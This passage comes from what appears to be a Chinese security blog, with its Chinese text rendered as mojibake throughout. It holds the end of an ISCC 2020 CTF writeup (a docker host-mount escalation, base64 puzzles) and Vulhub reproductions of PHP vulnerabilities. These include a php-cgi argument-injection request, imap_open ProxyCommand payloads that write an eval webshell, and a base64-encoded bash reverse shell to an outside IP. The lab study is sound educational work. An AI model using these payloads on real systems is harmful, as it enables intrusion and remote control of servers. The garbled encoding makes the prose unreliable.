class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿›å»ä¹‹åå‘ç°flagåœ¨/root/flag.txt,åå¼¹shell,dockerææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull alpine</span><br><span class="line">docker docker run -id -v /:/tmp alpine</span><br><span class="line">docker <span class="built_in">exec</span> 68335e7b38e0 cat /tmp/root/flag.txt</span><br></pre></td></tr></table></figure><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200524230551.png" style="zoom:80%;"><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><h4 id="æ˜¯æˆ‘DIOå“’"><a href="#æ˜¯æˆ‘DIOå“’" class="headerlink" title="æ˜¯æˆ‘DIOå“’"></a>æ˜¯æˆ‘DIOå“’</h4><p>foremoståˆ†ç¦»å‡ºä¸€å¼ äºŒç»´ç ï¼Œä¸çŸ¥é“binwalkä¸ºå•¥ä¸è¡Œï¼Œæ‰«å‡ºæ¥æ˜¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Useful_Massage_1(SVNDQyU3QmZsQGdfaXN</span><br></pre></td></tr></table></figure><p>StegSolveåˆ†ç¦»å‡ºç¬¬äºŒéƒ¨åˆ†</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200507153230.png" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Useful_M assage_2(fa09fTjBfRCUyMW9fZGFhYW ElMjFfXyU3RA&#x3D;&#x3D;)</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥åˆ°ä¸€å—ï¼Œbase64è§£å¯†å¹¶urlè§£ç å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;fl@g_is_kO_N0_D!o_daaaa!__&#125;</span><br></pre></td></tr></table></figure><h4 id="Easy-Minecraft"><a href="#Easy-Minecraft" class="headerlink" title="Easy_Minecraft"></a>Easy_Minecraft</h4><p>ä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬çš„mcï¼Œæ·»åŠ æœåŠ¡å™¨å‘ç°ï¼š</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200512130457.png" style="zoom: 67%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key2:Decode(n*Base64_Decode(VlRKR2MyUkhWbXRZTVNzNVRWVkp0VFl3YVdoUmRFNXBNelozYkVKWVJWbE9Za1pKUVV4b00wdDJRU1V6UkElM0QlM0Q%3D))</span><br></pre></td></tr></table></figure><p>base64è§£å¯†ä¸€æ¬¡ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VTJGc2RHVmtYMSs5TVVJtTYwaWhRdE5pMzZ3bEJYRVlOYkZJQUxoM0t2QSUzRA&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>å†è§£å¯†ä¸€æ¬¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+9MUIÂµ60ihQtNi36wlBXEYNbFIALh3KvA&#x3D;</span><br></pre></td></tr></table></figure><p>ç›´æ¥åŠ å…¥æœåŠ¡å™¨ä¼šæç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tJNV90aDFzX2ZsQGc&#x2F;fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64è§£å¯†ä¹‹åæ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I5_th1s_fl@g?&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ISCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhubä¹‹php</title>
      <link href="2020/05/05/Vulhub%E4%B9%8Bphp/"/>
      <url>2020/05/05/Vulhub%E4%B9%8Bphp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦å¤ç°äº†Vulhubä¸Šçš„phpéƒ¨åˆ†æ¼æ´ï¼</p><a id="more"></a><h2 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h2><h3 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>è¯¥æ¼æ´å¯å¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><p>WEB ä¸­ï¼Œ</p><ul><li><p><strong>Web Server ä¸€èˆ¬æŒ‡Apacheã€Nginxã€IISã€Lighttpdã€Tomcatç­‰æœåŠ¡å™¨</strong></p></li><li><p><strong>Web Application ä¸€èˆ¬æŒ‡PHPã€Javaã€Asp.netç­‰åº”ç”¨ç¨‹åº</strong></p></li><li><p><strong>cgiï¼š Web Server ä¸ Web Application ä¹‹é—´æ•°æ®äº¤æ¢çš„ä¸€ç§åè®®</strong></p></li><li><p><strong>FastCGIï¼šåŒ CGIï¼Œæ˜¯ä¸€ç§é€šä¿¡åè®®ï¼Œä½†æ¯” CGI åœ¨æ•ˆç‡ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚åŒæ ·ï¼ŒSCGI åè®®ä¸ FastCGI ç±»ä¼¼</strong></p></li><li><p><strong>PHP-CGIï¼šæ˜¯ PHP ï¼ˆWeb Applicationï¼‰å¯¹ Web Server æä¾›çš„ CGI åè®®çš„æ¥å£ç¨‹åº</strong></p></li><li><p><strong>PHP-FPMï¼šæ˜¯ PHPï¼ˆWeb Applicationï¼‰å¯¹ Web Server æä¾›çš„ FastCGI åè®®çš„æ¥å£ç¨‹åºï¼Œé¢å¤–è¿˜æä¾›äº†ç›¸å¯¹æ™ºèƒ½ä¸€äº›ä»»åŠ¡ç®¡ç†</strong></p></li></ul><p>åœ¨æ•´ä¸ªç½‘ç«™æ¶æ„ä¸­ï¼ŒWeb Serverï¼ˆå¦‚Apacheï¼‰åªæ˜¯å†…å®¹çš„åˆ†å‘è€…ã€‚å¦‚æœå®¢æˆ·ç«¯è¯·æ±‚çš„æ˜¯ <code>index.html</code>ï¼Œé‚£ä¹ˆWeb Serverä¼šå»æ–‡ä»¶ç³»ç»Ÿä¸­æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œå‘é€ç»™æµè§ˆå™¨ï¼Œä¸‹å›¾åˆ†å‘çš„æ˜¯é™æ€æ•°æ®ã€‚</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/html.png" style="zoom:80%;"><p>å¦‚æœè¯·æ±‚çš„æ˜¯ index.phpï¼Œæ ¹æ®é…ç½®æ–‡ä»¶ï¼ŒWeb ServerçŸ¥é“è¿™ä¸ªä¸æ˜¯é™æ€æ–‡ä»¶ï¼Œéœ€è¦å»æ‰¾ PHP è§£æå™¨æ¥å¤„ç†ï¼Œé‚£ä¹ˆä»–ä¼šæŠŠè¿™ä¸ªè¯·æ±‚ç®€å•å¤„ç†ï¼Œç„¶åäº¤ç»™PHPè§£æå™¨ã€‚</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/cgi.png" style="zoom:80%;"><p>å½“Web Serveræ”¶åˆ° index.php è¿™ä¸ªè¯·æ±‚åï¼Œä¼šå¯åŠ¨å¯¹åº”çš„ CGI ç¨‹åºï¼Œè¿™é‡Œå°±æ˜¯PHPçš„è§£æå™¨ã€‚æ¥ä¸‹æ¥PHPè§£æå™¨ä¼šè§£æphp.iniæ–‡ä»¶ï¼Œåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œç„¶åå¤„ç†è¯·æ±‚ï¼Œå†ä»¥è§„å®šCGIè§„å®šçš„æ ¼å¼è¿”å›å¤„ç†åçš„ç»“æœï¼Œé€€å‡ºè¿›ç¨‹ï¼ŒWeb serverå†æŠŠç»“æœè¿”å›ç»™æµè§ˆå™¨ã€‚è¿™å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åŠ¨æ€PHP Webè®¿é—®æµç¨‹ã€‚</p><p>æ›´è¯¦ç»†çš„å†…å®¹å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/zzx-hjl/p/10583849.html">https://www.cnblogs.com/zzx-hjl/p/10583849.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>æœ¬æ¼æ´åªå‡ºç°åœ¨ä»¥cgiæ¨¡å¼è¿è¡Œçš„phpä¸­ï¼Œå½±å“ç‰ˆæœ¬ <code>php &lt; 5.3.12 or php &lt; 5.4.2</code>ã€‚</p><p>è¿™ä¸ªæ¼æ´ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ç”¨æˆ·è¯·æ±‚çš„querystringè¢«ä½œä¸ºäº†php-cgiçš„å‚æ•°ï¼Œæœ€ç»ˆå¯¼è‡´äº†ä¸€ç³»åˆ—ç»“æœã€‚</p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>ç›´æ¥è®¿é—®ä¸€ä¸ªphpæ–‡ä»¶åŠ ä¸Š<code>-s</code>å°±èƒ½çœ‹åˆ°æºç </p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIMæˆªå›¾20200505214143.png" style="zoom:80%;"><p>é™¤äº†<code>-s</code>è¿˜æœ‰ä»¥ä¸‹å‚æ•°å¯ç”¨ï¼š</p><ul><li><code>-c</code> æŒ‡å®šphp.iniæ–‡ä»¶çš„ä½ç½®</li><li><code>-n</code> ä¸è¦åŠ è½½php.iniæ–‡ä»¶</li><li><code>-d</code> æŒ‡å®šé…ç½®é¡¹</li><li><code>-b</code> å¯åŠ¨fastcgiè¿›ç¨‹</li><li><code>-T</code> æ‰§è¡ŒæŒ‡å®šæ¬¡è¯¥æ–‡ä»¶</li><li><code>-h</code>å’Œ<code>-?</code> æ˜¾ç¤ºå¸®åŠ©</li></ul><p>æˆ‘ä»¬å¯ä»¥æ„é€ ä¸‹é¢çš„è¯·æ±‚æ¥æ‰§è¡Œä»£ç ï¼š</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIMæˆªå›¾20200505214846.png" style="zoom:80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">/index.php?-d+allow_url_include%<span class="number">3</span>don+-d+auto_prepend_file%<span class="number">3</span>dphp%<span class="number">3</span>a<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ¼æ´è¢«çˆ†å‡ºæ¥ä»¥åï¼ŒPHPå®˜æ–¹å¯¹å…¶è¿›è¡Œäº†ä¿®è¡¥ï¼Œå‘å¸ƒäº†æ–°ç‰ˆæœ¬5.4.2åŠ5.3.12ï¼Œä½†è¿™ä¸ªä¿®å¤æ˜¯ä¸å®Œå…¨çš„ï¼Œå¯ä»¥è¢«ç»•è¿‡ï¼Œè¿›è€Œè¡ç”Ÿå‡ºCVE-2012-2311æ¼æ´ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç©ºæ ¼+<code>-</code>ç»•è¿‡ã€‚</p><h2 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h2><h3 id="æ¼æ´ç®€ä»‹-1"><a href="#æ¼æ´ç®€ä»‹-1" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>è¯¥æ¼æ´å¯å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p><p>php imapæ‰©å±•ç”¨äºåœ¨PHPä¸­æ‰§è¡Œé‚®ä»¶æ”¶å‘æ“ä½œã€‚å…¶<code>imap_open</code>å‡½æ•°ä¼šè°ƒç”¨rshæ¥è¿æ¥è¿œç¨‹shellï¼Œè€Œdebian/ubuntuä¸­é»˜è®¤ä½¿ç”¨sshæ¥ä»£æ›¿rshçš„åŠŸèƒ½ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨debianç³»åˆ—ç³»ç»Ÿä¸­ï¼Œæ‰§è¡Œrshå‘½ä»¤å®é™…æ‰§è¡Œçš„æ˜¯sshå‘½ä»¤ï¼‰ã€‚</p><p>å› ä¸ºsshå‘½ä»¤ä¸­å¯ä»¥é€šè¿‡è®¾ç½®<code>-oProxyCommand=</code>æ¥è°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤ï¼Œæ”»å‡»è€…é€šè¿‡æ³¨å…¥æ³¨å…¥è¿™ä¸ªå‚æ•°ï¼Œæœ€ç»ˆå°†å¯¼è‡´å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æ¼æ´ç¯å¢ƒå…³é”®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST)) &#123;</span><br><span class="line">    $imap = @imap_open(<span class="string">&#x27;&#123;&#x27;</span>.$_POST[<span class="string">&#x27;hostname&#x27;</span>].<span class="string">&#x27;:993/imap/ssl&#125;INBOX&#x27;</span>, $_POST[<span class="string">&#x27;username&#x27;</span>], $_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤æ‰§è¡Œæ˜¯æ— å›æ˜¾çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°è¯•ç€å†™é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%<span class="number">2</span>BJz5tb29uYmFjay5waHA%<span class="number">3</span>D|base64%<span class="number">09</span>-d|sh&#125;&amp;username=<span class="number">111</span>&amp;password=<span class="number">222</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­base64ç¼–ç æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&gt;moonback.php</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¸ç”¨è¿™æ ·éº»çƒ¦ï¼Œç›´æ¥åŠ ä¸Š<code>;</code>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">hostname=x+-oProxyCommand%3d;ls&gt;a&#125;&amp;username=111&amp;password=222</span><br></pre></td></tr></table></figure><p>åå¼¹shell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>YmFzaCAtaSA%<span class="number">2</span>BJiAvZGV2L3RjcC80Ny45Ny4yMTAuMTQxLzkwMDAgMD4mMQ%<span class="number">3</span>D%<span class="number">3</span>D|base64%<span class="number">09</span>-d|bash&#125;&amp;username=<span class="number">111</span>&amp;password=<span class="number">222</span></span><br></pre></td></tr></table></figure><h2 id="CVE-2019-11043"><a href="#CVE-2019-11043" class="headerlink" title="CVE-2019-11043"></a>CVE-2019-11043</h2><h3 id="æ¼æ´ç®€ä»‹-2"><a href="#æ¼æ´ç®€ä»‹-2" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>åœ¨é•¿äº­ç§‘æŠ€ä¸¾åŠçš„ Real World CTF ä¸­ï¼Œå›½å¤–å®‰å…¨ç ”ç©¶å‘˜ Andrew Danau åœ¨è§£å†³ä¸€é“ CTF é¢˜ç›®æ—¶å‘ç°ï¼Œå‘ç›®æ ‡æœåŠ¡å™¨ URL å‘é€ %0a ç¬¦å·æ—¶ï¼ŒæœåŠ¡è¿”å›å¼‚å¸¸ï¼Œç–‘ä¼¼å­˜åœ¨æ¼æ´ã€‚</p><p>åœ¨ä½¿ç”¨ä¸€äº›æœ‰é”™è¯¯çš„Nginxé…ç½®çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡æ¶æ„æ„é€ çš„æ•°æ®åŒ…ï¼Œå³å¯è®©PHP-FPMæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p><strong>åˆ©ç”¨æ¡ä»¶å’Œå½±å“èŒƒå›´ï¼š</strong></p><p>åˆ©ç”¨æ¡ä»¶ä»¥åŠæ¼æ´å½±å“èŒƒå›´ã€‚</p><p>1ã€Nginx + php_fpmï¼Œä¸”é…ç½®<code>location ~ [^/]\.php(/|$)</code>ä¼šå°†è¯·æ±‚è½¬å‘åˆ°php-fpmã€‚<br>2ã€Nginxé…ç½®<code>fastcgi_split_path_info</code>å¹¶ä¸”ä»¥<code>^</code>å¼€å§‹ä»¥<code>$</code>ï¼Œåªæœ‰åœ¨è¿™ç§æ¡ä»¶ä¸‹æ‰å¯ä»¥é€šè¿‡æ¢è¡Œç¬¦æ¥æ‰“æ–­æ­£åˆ™è¡¨è¾¾å¼åˆ¤æ–­ã€‚ ps: åˆ™å…è®¸<code>index.php/321 -&gt; index.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_split_path_info ^(.+?\.php)(&#x2F;.*)$;</span><br></pre></td></tr></table></figure><p>3ã€<code>fastcgi_param</code>ä¸­<code>PATH_INFO</code>ä¼šè¢«å®šä¹‰é€šè¿‡<code>fastcgi_param PATH_INFO $fastcgi_path_info;</code>ï¼Œå½“ç„¶è¿™ä¸ªå˜é‡ä¼šåœ¨<code>fastcgi_params</code>é»˜è®¤å®šä¹‰ã€‚<br>4ã€åœ¨nginxå±‚é¢æ²¡æœ‰å®šä¹‰å¯¹æ–‡ä»¶çš„æ£€æŸ¥æ¯”å¦‚<code>try_files $uri =404</code>ï¼Œå¦‚æœnginxå±‚é¢åšäº†æ–‡ä»¶æ£€æŸ¥ï¼Œåˆ™è¯·æ±‚ä¸ä¼šè¢«è½¬å‘ç»™php-fmpã€‚</p><p>nginxé…ç½®ç±»ä¼¼äºï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">server_name</span> _;</span><br><span class="line"><span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line"><span class="comment">#try_files $uri =404;</span></span><br><span class="line"><span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line"><span class="attribute">fastcgi_pass</span> <span class="number">172.16.88.3:9000</span>;</span><br><span class="line"><span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line"><span class="attribute">include</span> fastcgi_params;</span><br><span class="line"><span class="attribute">fastcgi_param</span> SCRIPT_FILENAME /var/www/html<span class="variable">$fastcgi_script_name</span>;</span><br><span class="line"><span class="attribute">fastcgi_param</span> PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"><span class="attribute">fastcgi_hide_header</span> X-Powered-By;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ¼æ´åœ¨å®é™…ç ”ç©¶è¿‡ç¨‹ä¸­å¯¹çœŸå®ä¸–ç•Œå±å®³æœ‰é™ï¼Œå…¶ä¸»è¦åŸå› éƒ½åœ¨äºå¤§éƒ¨åˆ†çš„nginxé…ç½®ä¸­éƒ½æºå¸¦äº†å¯¹æ–‡ä»¶çš„æ£€æŸ¥ï¼Œä¸”é»˜è®¤çš„nginxé…ç½®ä¸åŒ…å«è¿™ä¸ªé—®é¢˜</p><h3 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>exp githubåœ°å€ï¼š<a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p><p>ubuntuå®‰è£…goç¯å¢ƒï¼Œç›´æ¥ç”¨aptå®‰è£…çš„æ˜¯1.6ç‰ˆæœ¬ï¼Œè¯¥è„šæœ¬è¦æ±‚1.13åŠä»¥ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:longsleep/golang-backports</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install golang-go</span><br></pre></td></tr></table></figure><p>é»˜è®¤é¡¹ç›®æ–‡ä»¶å¤¹æ˜¯<code>~/go</code>ï¼Œæ¥ç€å°±</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/neex/phuip-fpizdam</span><br></pre></td></tr></table></figure><p>åœ¨<code>~/go/bin</code>ä¸‹é¢å°±èƒ½çœ‹åˆ°ç¼–è¯‘æˆåŠŸçš„äºŒè¿›åˆ¶æ–‡ä»¶äº†ï¼Œè·‘exp:</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIMæˆªå›¾20200506102252.png" style="zoom:80%;"><p>ç„¶åå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†</p><img src="/2020/05/05/Vulhub%E4%B9%8Bphp/TIMæˆªå›¾20200506102412.png" style="zoom:80%;"><h2 id="åˆ©ç”¨phpinfoåŒ…å«ä¸´æ—¶æ–‡ä»¶"><a href="#åˆ©ç”¨phpinfoåŒ…å«ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨phpinfoåŒ…å«ä¸´æ—¶æ–‡ä»¶"></a>åˆ©ç”¨phpinfoåŒ…å«ä¸´æ—¶æ–‡ä»¶</h2><h3 id="æ¼æ´ç®€ä»‹-3"><a href="#æ¼æ´ç®€ä»‹-3" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>è¯¥æ¼æ´éœ€è¦æœ‰åŒ…å«ç‚¹ï¼Œå¹¶ä¸”æœ‰phpinfoé¡µé¢ï¼Œç„¶åå°±èƒ½getshellï¼Œè¯¥æ¼æ´ä¸phpç‰ˆæœ¬æ— å…³</p><p>åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºä½ è®¿é—®çš„ä»£ç ä¸­æœ‰æ²¡æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼ŒPHPéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯<code>/tmp/php[6ä¸ªéšæœºå­—ç¬¦]</code>ï¼‰ï¼Œæ–‡ä»¶åå¯ä»¥åœ¨<code>$_FILES</code>å˜é‡ä¸­æ‰¾åˆ°ã€‚è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ã€‚</p><p>åŒæ—¶ï¼Œå› ä¸ºphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœå‘phpinfoé¡µé¢å‘é€åŒ…å«æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…ï¼Œåˆ™å³å¯åœ¨è¿”å›åŒ…é‡Œæ‰¾åˆ°<code>$_FILES</code>å˜é‡çš„å†…å®¹ï¼Œè‡ªç„¶ä¹ŸåŒ…å«ä¸´æ—¶æ–‡ä»¶åã€‚</p><p>åœ¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰¾ä¸åˆ°å¯åˆ©ç”¨çš„æ–‡ä»¶æ—¶ï¼Œå³å¯åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶åï¼Œç„¶ååŒ…å«ä¹‹ã€‚</p><p>ä½†æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå†å°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ï¼Œè¿›è¡Œgetshellã€‚åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ç»“æŸæ—¶ï¼Œä¸´æ—¶æ–‡ä»¶å°±è¢«åˆ é™¤äº†ï¼Œç¬¬äºŒä¸ªè¯·æ±‚è‡ªç„¶ä¹Ÿå°±æ— æ³•è¿›è¡ŒåŒ…å«ã€‚</p><p>è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>å‘é€åŒ…å«äº†webshellçš„ä¸Šä¼ æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œè¿™ä¸ªæ•°æ®åŒ…çš„headerã€getç­‰ä½ç½®éœ€è¦å¡æ»¡åƒåœ¾æ•°æ®</li><li>å› ä¸ºphpinfoé¡µé¢ä¼šå°†æ‰€æœ‰æ•°æ®éƒ½æ‰“å°å‡ºæ¥ï¼Œ1ä¸­çš„åƒåœ¾æ•°æ®ä¼šå°†æ•´ä¸ªphpinfoé¡µé¢æ’‘å¾—éå¸¸å¤§</li><li>phpé»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå¯ä»¥ç†è§£ä¸ºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥</li><li>æ‰€ä»¥ï¼Œæˆ‘ä»¬ç›´æ¥æ“ä½œåŸç”Ÿsocketï¼Œæ¯æ¬¡è¯»å–4096ä¸ªå­—èŠ‚ã€‚åªè¦è¯»å–åˆ°çš„å­—ç¬¦é‡ŒåŒ…å«ä¸´æ—¶æ–‡ä»¶åï¼Œå°±ç«‹å³å‘é€ç¬¬äºŒä¸ªæ•°æ®åŒ…</li><li>æ­¤æ—¶ï¼Œç¬¬ä¸€ä¸ªæ•°æ®åŒ…çš„socketè¿æ¥å®é™…ä¸Šè¿˜æ²¡ç»“æŸï¼Œå› ä¸ºphpè¿˜åœ¨ç»§ç»­æ¯æ¬¡è¾“å‡º4096ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ä¸´æ—¶æ–‡ä»¶æ­¤æ—¶è¿˜æ²¡æœ‰åˆ 